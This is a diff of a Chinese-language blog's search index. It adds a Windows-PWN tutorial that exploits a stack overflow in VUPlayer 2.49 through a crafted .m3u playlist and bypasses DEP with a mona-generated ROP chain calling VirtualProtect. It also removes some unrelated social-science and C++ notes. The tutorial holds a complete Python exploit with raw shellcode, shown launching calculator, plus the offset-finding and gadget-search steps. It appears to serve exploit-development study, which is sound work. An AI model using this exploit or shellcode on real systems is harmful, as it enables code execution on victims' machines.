+    <content><![CDATA[<p>当程序开启数据执行保护（DEP）后，我们无法在栈上执行<code>shellcode</code>，但可以利用程序中自带的代码片段（gadget），使<code>ret</code>指令和栈数据相配合，将 <code>gadget</code>串成一串，也能起到<code>shellcode</code>的效果，这就是返回导向编程<code>ROP</code>。</p>
+<p>参考链接：</p>
 <ul>
-<li>民主程度，取决于民众对官僚的威慑力度。</li>
-<li>人性随生产力变化而变化，制度随生产力变化而变化；而不是不变的人性形成不变的制度。</li>
+<li><a href="https://www.freebuf.com/articles/system/173654.html">Windows漏洞利用开发：返回导向编程(ROP)</a></li>
 </ul>
+<span id="more"></span>
+
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
+<li><p>Immunity Debugger : 一个windows下由纯python编写的调试器，有丰富的python安全工具库。</p>
+<ul>
+<li>下载链接：<a href="https://github.com/kbandla/ImmunityDebugger/releases">ImmunityDebugger</a></li>
+</ul>
+</li>
+<li><p>mona插件：将mona.py放到Immunity Debugger 的PyCommands目录下即可</p>
+<ul>
+<li>下载链接：<a href="https://github.com/corelan/mona/raw/master/mona.py">mona.py</a></li>
+</ul>
+</li>
+<li><p>VUPlayer ： 一个小巧的音乐播放器。2.49版本在打开 play list 时存在缓冲区溢出漏洞。</p>
+<ul>
+<li>下载链接：<a href="https://www.exploit-db.com/exploits/40018">VUPlayer 2.49</a></li>
+</ul>
+</li>
+<li><p>DEP：开启操作系统的<code>DEP</code>设置（WIN10下：设置—系统—关于—高级系统设置—性能-设置—数据执行保护—选中“DEP(U)”）</p>
+</li>
+<li><p>随机基址(ASLR): 关闭</p>
+</li>
+</ul>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>编写python脚本，生成一个 test.m3u</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">3000</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
+<p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确定存在栈溢出漏洞</p>
+<p><img src="/../pic/Exploitme-ROP/EIP41414141.png" alt="EIP41414141"></p>
+<h3 id="确认偏移量"><a href="#确认偏移量" class="headerlink" title="确认偏移量"></a>确认偏移量</h3><p>在windbg中输入以下命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_create 3000</span><br><span class="line">或者</span><br><span class="line">!py mona pc 3000</span><br></pre></td></tr></table></figure>
+
+<p>将得到的3000个字符拷贝到<code>test.m3u</code>文件，重复之前的操作，得到</p>
+<p><img src="/../pic/Exploitme-ROP/EIPpattern.png" alt="EIPpattern"></p>
+<p>之后执行以下命令，确定偏移量（偏移量指输入点距栈中返回地址之间的字节数）：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_offset 68423768</span><br><span class="line">或</span><br><span class="line">!py mona po 0x68423768  # 0x可以省略</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/../pic/Exploitme-ROP/mona_po.png" alt="mona_po"></p>
+<p>确定偏移量为 1012 。</p>
+<p>使用以下脚本，重复操作，测试偏移量是否正确：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload = &quot;A&quot;*1012 + &quot;B&quot;*4</span><br><span class="line">file = open(&#x27;test.m3u&#x27;,&#x27;w&#x27;)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>看到 EIP 成功被 0x42424242 覆盖，偏移量正确</p>
+<p><img src="/../pic/Exploitme-ROP/EIP42424242.png" alt="EIP42424242"></p>
+<h3 id="直接在栈上执行shellcode"><a href="#直接在栈上执行shellcode" class="headerlink" title="直接在栈上执行shellcode"></a>直接在栈上执行shellcode</h3><h4 id="搜索跳转指令"><a href="#搜索跳转指令" class="headerlink" title="搜索跳转指令"></a>搜索跳转指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona j -r esp</span><br></pre></td></tr></table></figure>
+
+<p>得到以下输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;jmp esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 1 </span><br><span class="line">[+] Results : </span><br><span class="line">0x1000d0ff |   0x1000d0ff : jmp esp | null &#123;PAGE_EXECUTE_READWRITE&#125; [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASS.dll), 0x0</span><br><span class="line">0x1010539f |   0x1010539f : jmp esp |  &#123;PAGE_EXECUTE_READWRITE&#125; [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASSWMA.dll), 0x0</span><br><span class="line">...、、</span><br><span class="line">    Found a total of 15 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:04.439000</span><br></pre></td></tr></table></figure>
+
+<h4 id="尝试执行栈上指令"><a href="#尝试执行栈上指令" class="headerlink" title="尝试执行栈上指令"></a>尝试执行栈上指令</h4><p>选用 <code>0x1010539f</code>（<code>0x1000d0ff</code>存在”<code>\x00</code>“，不能正常工作）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">1012</span> + <span class="string">b&quot;\x9f\x53\x10\x10&quot;</span> + <span class="string">b&quot;\xcc&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>在windbg下打开<code>VMPlayer</code>，拖入<code>test.m3u</code>文件，得到以下结果：</p>
+<p><img src="/../pic/Exploitme-ROP/DEP_c0000005.png" alt="dep_red"></p>
+<p>说明开启了<code>DEP</code>防护，无法直接执行shellcode。</p>
+<h3 id="构造ROP使用绕过DEP"><a href="#构造ROP使用绕过DEP" class="headerlink" title="构造ROP使用绕过DEP"></a>构造ROP使用绕过DEP</h3><p>我们需要使用<code>ROP</code>调用<code>VirtualProtect</code>函数，以关闭shellcode所在页的<code>DEP</code>保护。</p>
+<h4 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h4><p>首先介绍VirtualProtect函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOL VirtualProtect (</span><br><span class="line">	LPVOID lpAddress, 	# 要改变属性的内存起始地址</span><br><span class="line">	DWORD dwSize,		# 要改百年属性的内存字节数</span><br><span class="line">	DWORD flNewProtect,	# 输入新的页属性</span><br><span class="line">	PDWORD lpflOldProtect # 返回旧的页属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>页属性为 <code>PAGE_EXECUTE_READWRITE(0x40)</code>时，该页可读可写可执行。</p>
+<p>我们的调用参数应该如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span> <span class="params">(</span></span><br><span class="line"><span class="params">	shellcode_addr，# shellcode起始地址</span></span><br><span class="line"><span class="params">    shellcode_len, 	# 不小于shellcode长度，比如 <span class="number">0x201</span>(常用)</span></span><br><span class="line"><span class="params">    <span class="number">0x40</span>,			# PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="params">    某个可写地址，</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="mona搜索ROPChain"><a href="#mona搜索ROPChain" class="headerlink" title="mona搜索ROPChain"></a>mona搜索ROPChain</h4><ul>
+<li>优先使用程序本身的<code>dll</code>而不是系统库，前者没开启<code>ASLR</code>，即便系统重启，<code>payload</code>仍有效。</li>
+<li><code>-cp nonull</code> 避免出现”<code>\x00</code>“字节导致<code>payload</code>被截断</li>
+<li><code>mona</code>可以设置日志文件的存放目录（目录路径不要加双引号）</li>
+</ul>
+<p><code>windbg</code>下执行以下命令，由于缺少符文报错，尝试<code>immunity debugger</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;bass,basswma,bassmidi&quot;</span> -cp nonull</span><br></pre></td></tr></table></figure>
+
+<p><code>immunity debugger</code>下执行以下命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme-ROP\mona-log</span><br><span class="line">!mona rop -m &quot;bass,basswma,bassmidi&quot; -cp nonull</span><br></pre></td></tr></table></figure>
+
+<p>成功执行，输出信息如下：</p>
+<p><img src="/../pic/Exploitme-ROP/immu-mona-rop.png" alt="immu-mona-rop"></p>
+<p>在日志目录下生成了以下几个文件：</p>
+<p><img src="/../pic/Exploitme-ROP/mona-log.png" alt="mona-log"></p>
+<p>查看<code>rop_chains.txt</code>，其中包含建议使用的<code>rop_chain</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Register setup for VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class="line"> ...</span><br><span class="line"> def create_rop_chain():</span><br><span class="line">    # rop chain generated with mona.py - www.corelan.be</span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      #[---INFO:gadgets_to_set_esi:---]</span><br><span class="line">      0x10015f82,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x1060e25c,  # ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span><br><span class="line">      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span><br><span class="line">      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ebp:---]</span><br><span class="line">      </span><br><span class="line">      0x1001d748,  # POP EBP # RETN [BASS.dll] </span><br><span class="line">      0x1010539f,  # &amp; jmp esp [BASSWMA.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_ebx:---]</span><br><span class="line">      0x10015f77,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xfffffdff,  # Value to negate, will become 0x00000201</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_edx:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xffffffc0,  # Value to negate, will become 0x00000040</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ecx:---]</span><br><span class="line">      0x101012e0,  # POP ECX # RETN [BASSWMA.dll] </span><br><span class="line">      0x1003f0cc,  # &amp;Writable location [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_edi:---]</span><br><span class="line">      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] </span><br><span class="line">      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_eax:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x90909090,  # nop</span><br><span class="line">      #[---INFO:pushad:---]</span><br><span class="line">      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] </span><br><span class="line">    ]</span><br><span class="line">    return &#x27;&#x27;.join(struct.pack(&#x27;&lt;I&#x27;, _) for _ in rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br></pre></td></tr></table></figure>
+
+<h4 id="RopChain分析"><a href="#RopChain分析" class="headerlink" title="RopChain分析"></a>RopChain分析</h4><p><code>ropchain</code>是十分精巧的。ropchain的主要目的是为 <code>VirtualProtect()</code> 提供参数和控制执行流。</p>
+<p>在执行完<code>pushad</code>之后，栈中数据的内容应该如下：</p>
+<ul>
+<li><code>_edi</code> 表示执行<code>pushad</code>前对应寄存器中的值</li>
+<li><code>-&gt; &lt;func&gt;</code> 表示<code>&lt;func&gt;</code>的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_edi # -&gt; retn</span><br><span class="line">_esi # -&gt; vitrualprotect</span><br><span class="line">_ebp # -&gt; jump esp</span><br><span class="line">_esp # shllcode的起始地址</span><br><span class="line">_ebx # 0x201</span><br><span class="line">_edx # 0x40</span><br><span class="line">_ecx # 0x1003f0cc，一个可写地址</span><br><span class="line">_eax # nop</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>
+
+<p>执行了<code>pushad</code>之后，<code>retn</code>指令从栈顶端取出新的指令地址，并跳转至该地址开始执行，发现还是个<code>retn</code>，重复之前过程，便将控制流指向了<code>VirtualProtect</code>函数。</p>
+<p><code>VirtualProtect</code>函数将<code>_ebp</code>看作返回地址，将再下面的四个值看作四个输入的参数，函数效果为关闭<code>shellcode</code>所在页内存的<code>DEP</code>保护。<code>_eax</code>没用。</p>
+<p>执行完后，<code>jump esp</code>便将执行流转到<code>shellcode</code>。</p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>完整的<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x10015f82</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1060e25c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span></span><br><span class="line">      <span class="number">0x1001eaf1</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10030950</span>,  <span class="comment"># XCHG EAX,ESI # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x1001d748</span>,  <span class="comment"># POP EBP # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1010539f</span>,  <span class="comment"># &amp; jmp esp [BASSWMA.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x10015f77</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10032f32</span>,  <span class="comment"># XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10038a6d</span>,  <span class="comment"># XCHG EAX,EDX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x101012e0</span>,  <span class="comment"># POP ECX # RETN [BASSWMA.dll] </span></span><br><span class="line">      <span class="number">0x1003f0cc</span>,  <span class="comment"># &amp;Writable location [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10603658</span>,  <span class="comment"># POP EDI # RETN [BASSMIDI.dll] </span></span><br><span class="line">      <span class="number">0x1001dc05</span>,  <span class="comment"># RETN (ROP NOP) [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1001d7a5</span>,  <span class="comment"># PUSHAD # RETN [BASS.dll] </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line">    </span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line">shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">1012</span> + rop_chain + shellcode</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;payload.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>运行<code>exp.py</code>，将生成的<code>payload.m3u</code>拖入<code>VUPlayer</code>，成功弹出计算器，如图：</p>
+<p><img src="/../pic/Exploitme-ROP/pwn.png" alt="pwn"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><code>mona</code>在<code>Immunity debugger</code>中比在<code>Windbg</code>中更好用，虽然后者更美观。</li>
+<li><code>mona</code>很智能，生成的<code>rop_chains.txt</code>中的<code>ropchain</code>可以直接使用。</li>
+</ol>
 ]]></content>
       <categories>
-        <category>社科知识</category>
+        <category>Windows-PWN</category>
       </categories>
   </entry>
   <entry>
-    <title>winsock practice</title>
-    <url>/2023/10/19/winsock-practice/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>Exploitme4——ROP with ASLR</title>
-    <url>/2023/10/27/Exploitme4/</url>
+    <url>/2023/10/27/Windwos-PWN/Exploitme/Exploitme4/</url>
     <content><![CDATA[<p>当程序开启了<code>ASLR</code>后，程序可能通过需要想办法泄露一些模块的基地址，来构建有效的payload。</p>
 <p>下面我们要进行的实验，采取的思路是：泄露系统模块的基址 + 利用对应模块中的gadget构建Ropchain + shellcode。</p>
 <p>参考资料：</p>
@@ -1010,191 +1231,6 @@
 ]]></content>
       <categories>
         <category>Windows-PWN</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Learning-C++</title>
-    <url>/2023/10/29/Learning-Cpp/</url>
-    <content><![CDATA[<p>c++学习笔记。</p>
-<span id="more"></span>
-
-<h2 id="基础新特性"><a href="#基础新特性" class="headerlink" title="基础新特性"></a>基础新特性</h2><ul>
-<li><p>命名空间 namespace</p>
-</li>
-<li><p>类型增强</p>
-<ul>
-<li><p>常量</p>
-<ul>
-<li><p>const</p>
-<ul>
-<li><p>常量指针</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* p = <span class="string">&quot;hello world&quot;</span>; <span class="comment">// const char* == char const*</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 出错，常量指针，指向的是常量，无法通过常量指针修改所指内容</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>指针常量</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="type">const</span> p = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">p++; <span class="comment">// 出错，指针常量，无法修改p的值</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span>; <span class="comment">// 但可以修改所指向的内容</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>constexpr: 编译时求值</p>
-</li>
-</ul>
-</li>
-<li><p>bool</p>
-</li>
-<li><p>enum</p>
-</li>
-<li><ul>
-<li></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>运算符重载</p>
-<ul>
-<li>方便混合处理多种类型不同的值</li>
-</ul>
-</li>
-<li><p>变量初始化</p>
-<ul>
-<li>除了“&#x3D;”，还可以使用 <code>&#123;&#125;</code>和<code>()</code>进行初始化</li>
-</ul>
-</li>
-<li><p>auto</p>
-<ul>
-<li>编译期，自动类型推断</li>
-</ul>
-</li>
-<li><p>范围for语句</p>
-<ul>
-<li><pre><code class="c">for(auto x : v) &#123;&#125; // 存在内存复制操作
-for(auto &amp;x : v) &#123;&#125; // 省去了内存复制操作
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- new/delete</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    指针变量名 = new 类型名; // delete p;</span><br><span class="line">    指针变量名 = new 类型名(初值); // delete p;</span><br><span class="line">    指针变量名 = new 类型名[变量个数];	// delete[] p;</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-</li>
-<li><p>nullptr</p>
-<ul>
-<li>NULL : int 0</li>
-<li>nullptr : std::nullptr_t | void * 0</li>
-<li>nullptr &#x3D;&#x3D; NULL &#x3D;&#x3D; 0 √</li>
-</ul>
-</li>
-<li><p>强制类型转换</p>
-<ul>
-<li>static_cast</li>
-<li>dynamic_cast</li>
-<li>const_cast</li>
-<li>reinterpret_cast</li>
-</ul>
-</li>
-</ul>
-<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
-<li><p>不占用内存，编译时转换为寄存器赋值</p>
-</li>
-<li><p>变量与引用的隐式转换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int &amp;a1 = a; // 同一个变量，一般不额外占内存：变量-&gt;引用</span><br><span class="line">int &amp;a2 = a1; // 仍是同一个变量</span><br><span class="line">int b = a; // 创建新变量：变量-&gt;变量</span><br><span class="line">int b1 = a1; // 创建新变量：引用-&gt;变量</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>普通引用和常量引用</p>
-<ul>
-<li>不能通过常量引用修改变量</li>
-<li>作函数参数时，常量引用可以接收普通引用，但普通引用不能接收常量引用(常量)</li>
-</ul>
-</li>
-</ul>
-<h2 id="结构体和类"><a href="#结构体和类" class="headerlink" title="结构体和类"></a>结构体和类</h2><ul>
-<li><p>结构体struct</p>
-<ul>
-<li>除了成员变量，还可以拥有成员函数</li>
-</ul>
-</li>
-<li><p>权限修饰符</p>
-<ul>
-<li>public</li>
-<li>protected</li>
-<li>private</li>
-</ul>
-</li>
-<li><p>类class</p>
-<ul>
-<li>和结构体十分类似</li>
-<li>区别：结构体各成员默认public 类各成员默认private</li>
-</ul>
-</li>
-<li><p>代码组织结构</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student.h ：类Student的定义</span><br><span class="line">student.cpp ：#include &quot;student.h&quot; + 类Student的定义</span><br><span class="line">other.cpp : #include &quot;student.h&quot;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="函数新特新"><a href="#函数新特新" class="headerlink" title="函数新特新"></a>函数新特新</h2><ul>
-<li><p>后置返回类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto func(int, int);</span><br><span class="line">auto func(int, int) -&gt; int &#123;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>inline内联函数</p>
-<ul>
-<li>普通函数的定义一般放在.cpp文件，inline函数可以直接放在.h文件中（普通函数只能定义一次，但内联函数可以多次定义(得一致)）</li>
-<li>函数体代替函数调用，节省简单函数的调用开销</li>
-</ul>
-</li>
-<li><p>函数参数</p>
-<ul>
-<li><p>默认参数</p>
-</li>
-<li><p>空参，空着或者 void</p>
-</li>
-</ul>
-</li>
-<li><p>函数重载</p>
-<ul>
-<li><p>函数允许同名，但函数类型或参数要有明显区别</p>
-</li>
-<li><p>比较函数类型时，const关键字会被忽略</p>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote>
-<p>可变长字符串</p>
-</blockquote>
-<ul>
-<li><p>初始化</p>
